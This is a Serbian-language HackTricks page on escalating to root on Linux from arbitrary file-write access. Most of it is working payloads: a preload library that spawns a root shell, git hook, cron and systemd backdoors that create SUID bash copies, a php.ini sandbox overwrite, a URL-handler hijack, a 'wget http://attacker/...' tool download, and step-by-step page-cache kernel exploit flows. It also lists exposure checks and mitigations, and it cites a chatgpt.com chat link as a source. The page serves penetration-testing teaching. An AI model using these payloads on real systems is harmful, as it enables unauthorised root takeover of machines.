# Proizvoljan upis u fajl sa root privilegijama

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ovaj fajl se ponaša kao **`LD_PRELOAD`** env promenljiva, ali takođe funkcioniše u **SUID binarnim fajlovima**.\
Ako možete da ga kreirate ili izmenite, jednostavno možete dodati **putanju do biblioteke koja će biti učitana** sa svakim izvršenim binarnim fajlom.

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) su **skripte** koje se **izvršavaju** pri različitim **događajima** u git repozitorijumu, na primer kada se kreira commit, izvrši merge... Dakle, ako **privilegovana skripta ili korisnik** često izvršava ove radnje i moguće je **pisati u `.git` direktorijum**, ovo može da se iskoristi za **privesc**.

Na primer, moguće je **generisati skriptu** u git repozitorijumu u **`.git/hooks`** tako da se uvek izvršava kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron i vremenske datoteke

Ako možete da **upisujete u datoteke povezane sa cron-om koje root izvršava**, obično možete dobiti izvršavanje koda sledeći put kada se job pokrene. Zanimljive mete uključuju:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root-ov sopstveni crontab u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` timers i services koje oni pokreću

Brze provere:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipični načini zloupotrebe:

- **Dodavanje novog root cron job-a** u `/etc/crontab` ili datoteku u `/etc/cron.d/`
- **Zamena skripte** koju `run-parts` već izvršava
- **Postavljanje backdoor-a u postojeći timer target** izmenom skripte ili binarnog fajla koji pokreće

Minimalni primer cron payload-a:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ako možete da pišete samo unutar cron direktorijuma koji koristi `run-parts`, umesto toga tamo postavite izvršivu datoteku:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Napomene:

- `run-parts` obično ignoriše nazive fajlova koji sadrže tačke, zato koristite nazive poput `backup` umesto `backup.sh`.
- Neke distribucije koriste `anacron` ili `systemd` timere umesto klasičnog cron-a, ali ideja zloupotrebe je ista: **izmenite ono što će root kasnije izvršiti**.

### Service & Socket files

Ako možete da upisujete u **`systemd` unit files** ili fajlove na koje oni upućuju, možda ćete moći da dobijete izvršavanje koda kao root ponovnim učitavanjem i restartovanjem unita ili čekanjem da se aktivira service/socket putanja.

Zanimljive mete obuhvataju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides u `/etc/systemd/system/<unit>.d/*.conf`
- Service skripte/binarne fajlove na koje upućuju `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` putanje koje učitava root service

Brze provere:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Uobičajeni načini zloupotrebe:

- **Overwrite `ExecStart=`** u service unit-u u vlasništvu root-a koji možete da menjate
- **Add a drop-in override** sa zlonamernim `ExecStart=` i prvo obrišite staru vrednost
- **Backdoor** skripte/binarne datoteke na koju se unit već poziva
- **Hijack** socket-activated service-a izmenom odgovarajuće `.service` datoteke koja se pokreće kada socket primi konekciju

Primer zlonamernog override-a:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipičan tok aktivacije:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ako ne možete sami da restartujete servise, ali možete da izmenite jedinicu aktiviranu putem socket-a, možda je potrebno samo da **sačekate konekciju klijenta** kako biste pokrenuli izvršavanje backdoored servisa kao root.

### Prepisivanje restriktivnog `php.ini` fajla koji koristi privilegovani PHP sandbox

Neki prilagođeni daemon-i proveravaju PHP koji je dostavio korisnik tako što pokreću `php` sa **restriktivnim `php.ini` fajlom** (na primer, `disable_functions=exec,system,...`). Ako kod koji se izvršava u sandbox-u i dalje ima **bilo kakav primitive za upisivanje** (kao što je `file_put_contents`) i možete da pristupite **tačnoj putanji `php.ini` fajla** koju koristi daemon, možete da **prepišete tu konfiguraciju** kako biste uklonili ograničenja, a zatim pošaljete drugi payload koji se izvršava sa povišenim privilegijama.<sup>[[2]](#references)</sup>

Tipičan tok:

1. Prvi payload prepisuje konfiguraciju sandbox-a.
2. Drugi payload izvršava kod nakon što su opasne funkcije ponovo omogućene.

Minimalni primer (zamenite putanju onom koju koristi daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ako daemon radi kao root (ili proverava putanje u vlasništvu root korisnika), drugo izvršavanje daje root kontekst. Ovo je u suštini **privilege escalation putem prepisivanja konfiguracije** kada sandboxed runtime i dalje može da upisuje datoteke.

### binfmt_misc

Datoteka koja se nalazi u `/proc/sys/fs/binfmt_misc` pokazuje koji binary treba da izvršava koje vrste datoteka. TODO: proveriti zahteve za zloupotrebu ovoga radi izvršavanja rev shell-a kada se otvori uobičajeni tip datoteke.

### Prepisivanje schema handler-a (kao što su http: ili https:)

Napadač sa dozvolama za upis u konfiguracione direktorijume žrtve može lako da zameni ili kreira datoteke koje menjaju ponašanje sistema, što dovodi do nenameravanog izvršavanja koda. Izmenom datoteke `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS URL handler-i upućuju na zlonamernu datoteku (npr. postavljanjem `x-scheme-handler/http=evil.desktop`), napadač obezbeđuje da **klik na bilo koji http ili https link pokrene kod naveden u toj `evil.desktop` datoteci**. Na primer, nakon postavljanja sledećeg zlonamernog koda u `evil.desktop` u direktorijumu `$HOME/.local/share/applications`, svaki klik na eksterni URL pokreće ugrađenu komandu:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Za više informacija pogledajte [**ovu objavu**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), gde je iskorišćena stvarna ranjivost.

### Root izvršava scripts/binaries koje korisnik može da menja

Ako privileged workflow pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binary unutar direktorijuma čiji je vlasnik unprivileged user), možete preuzeti kontrolu nad njim:<sup>[[1]](#references)</sup>

- **Otkrivanje izvršavanja:** nadgledajte procese pomoću [pspy](https://github.com/DominicBreuker/pspy) da biste uhvatili root prilikom pozivanja putanja pod kontrolom korisnika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potvrdite mogućnost pisanja:** uverite se da su ciljni fajl i njegov direktorijum u vlasništvu vašeg korisnika ili da vaš korisnik ima dozvolu za pisanje.
- **Preuzmite kontrolu nad ciljem:** napravite rezervnu kopiju originalnog binary/script fajla i ubacite payload koji kreira SUID shell (ili izvršava bilo koju drugu root akciju), a zatim vratite dozvole:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Pokrenite privileged action** (npr. pritiskom na UI dugme koje pokreće helper). Kada root ponovo izvrši hijacked putanju, preuzmite escalated shell pomoću `./rootshell -p`.

### Izmena privileged binaries samo u page cache-u

Neki kernel bugovi ne menjaju fajl **na disku**. Umesto toga, omogućavaju izmenu samo **kopije u page cache-u** čitljivog fajla. Ako možete ciljati **setuid** ili na drugi način **root-executed** binary, sledeće izvršavanje može pokrenuti bytes pod kontrolom napadača iz memorije i omogućiti privilege escalation, iako hash fajla na disku ostaje nepromenjen.

Ovo je korisno posmatrati kao **runtime-only file write primitive**:

- **Disk ostaje čist**: inode i bytes na disku se ne menjaju
- **Memory je izmenjena**: procesi koji čitaju ili izvršavaju keširanu stranicu dobijaju sadržaj izmenjen od strane napadača
- **Efekat je privremen**: izmena nestaje nakon reboot-a ili izbacivanja iz cache-a

Ovaj primitive se nalazi između klasičnog **arbitrary file write** i starijih **page-cache abuse** bugova kao što su Dirty COW / Dirty Pipe:

- Dirty COW se oslanjao na race
- Dirty Pipe je imao ograničenja u poziciji upisa
- Primitive koji menja samo page cache može biti pouzdaniji ako vulnerable path omogućava direktne upise u keširane file-backed stranice

#### Generic privesc flow

1. Nabavite kernel primitive koji može da upisuje u **file-backed page cache pages**
2. Iskoristite ga protiv **readable privileged binary-ja** ili drugog fajla koji izvršava root
3. Pokrenite izvršavanje **pre** nego što stranica bude izbačena iz cache-a
4. Dobijte code execution kao root dok fajl na disku i dalje izgleda neizmenjeno

Tipične mete visoke vrednosti:

- **setuid-root** binaries
- Helper-i koje pokreću **root services**
- Binaries koji se često izvršavaju iz **containers** koji dele host kernel/page cache

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) je dobar primer ove klase. Vulnerable path se nalazio u Linux crypto userspace API-ju (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` može da prebaci reference na page-cache stranice iz readable fajla u crypto TX scatterlist
- in-place `algif_aead` decrypt path ponovo je koristio source i destination buffers
- `authencesn` je zatim upisivao u destination tag region
- kada je taj region i dalje referencirao spliced file-backed stranice, upis je završavao u **page cache-u ciljanog fajla**

Dakle, zanimljiva tehnika nije sam CVE, već obrazac:

- **ubacite file-backed cache stranice u kernel subsystem**
- omogućite da ih subsystem **tretira kao writable output**
- pokrenite mali, kontrolisani overwrite u memoriji

Javni PoC je koristio ponovljene **4-byte writes** za patchovanje `/usr/bin/su` u memoriji, a zatim ga je izvršavao.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) prikazuje drugu varijantu istog obrasca **page-cache-only write-to-root**, ali je ovog puta sink **IPsec ESP decrypt**, a ne `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Važna tehnika je korak **metadata-laundering**:

- `splice()` postavlja **read-only file-backed page-cache stranicu** u ESP-in-UDP packet
- originalni DirtyFrag mitigation označio je taj skb sa `SKBFL_SHARED_FRAG`, tako da bi `esp_input()` **kopirao pre decryptovanja**
- netfilter `TEE` duplira packet kroz `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone zadržava **istu fizičku page-cache referencu**, ali gubi `SKBFL_SHARED_FRAG`
- `esp_input()` zatim clone tretira kao bezbedan i izvršava **in-place `cbc(aes)` decrypt** nad file-backed stranicom

Dakle, lekcija za review je šira od samog CVE-a: ako se mitigation oslanja na **skb/page metadata** da bi odlučio da li operacija prvo mora da kopira podatke, bilo koji **clone/copy path koji očuva backing page, ali ukloni metadata** može neprimetno ponovo otvoriti write primitive.

Tipičan exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` za dobijanje **`CAP_NET_ADMIN` unutar privatnog network namespace-a**
2. podignite loopback i instalirajte **netfilter `TEE` rule** u `mangle/OUTPUT`
3. instalirajte **XFRM ESP transport SAs** preko `NETLINK_XFRM`
4. enkodujte svaku ciljanu 4-byte reč u SA `seq_hi` field-u (DirtyFrag-ov word-selection trick)
5. pošaljite spliced ESP-in-UDP packet tako da **TEE clone** stigne do `esp_input()` i izvrši decrypt **in place**
6. ponavljajte dok page-cache kopija fajla `/usr/bin/su` ili drugog privileged executable-a ne bude sadržala code pod kontrolom napadača

Operativno, impact je isti kao u `AF_ALG` primeru: fajl na disku ostaje čist, ali `execve()` koristi **izmenjene bytes iz page cache-a** i daje root.

Korisne provere izloženosti za ovu varijantu:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Smanjenje attack surface-a na kratki rok je i ovde specifično za putanju: nadogradnja na kernel koji sadrži `48f6a5356a33` popravlja clone putanju, dok blokiranje autoload-a za `xt_TEE` uklanja **flag-laundering korak**, a blokiranje `esp4` / `esp6` uklanja **decrypt sink**.

#### Exposure i hunting

Ako sumnjate na ovu klasu bug-a, nemojte se oslanjati samo na provere integriteta diska. Takođe proverite:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` može da se učita/ukloni kao modul
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs je ugrađen u kernel
- setuid binaries su dobre mete jer page-cache-only patch može biti dovoljan da se lokalni foothold pretvori u root

#### Smanjenje attack surface-a za `algif_aead` putanju

Ako je ranjivi interfejs obezbeđen kao loadable module:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ako je kompajlirano u kernel, u nekim disclosure-ima je prijavljeno blokiranje init path-a pomoću:
```bash
initcall_blacklist=algif_aead_init
```
Ovu vrstu mitigation-a vredi zapamtiti i za druge kernel LPE-ove: ako exploitation zavisi od određenog optional interface-a, njegovo onemogućavanje ili stavljanje na blacklist može prekinuti exploit path čak i pre nego što je dostupan potpuni kernel upgrade.

## Reference

- [1] [HTB Bamboo – preuzimanje skripte koju izvršava root u PaperCut direktorijumu u koji korisnik može da upisuje](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security objava o ranjivosti CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable ispravka: crypto: algif_aead - vraćanje rada out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint tehnički opis](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i exploitation Linux LPE varijante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux ispravka: net: skb: očuvati `SKBFL_SHARED_FRAG` u `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Ranija Linux mitigation: postaviti `SKBFL_SHARED_FRAG` za spliced UDP pakete (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
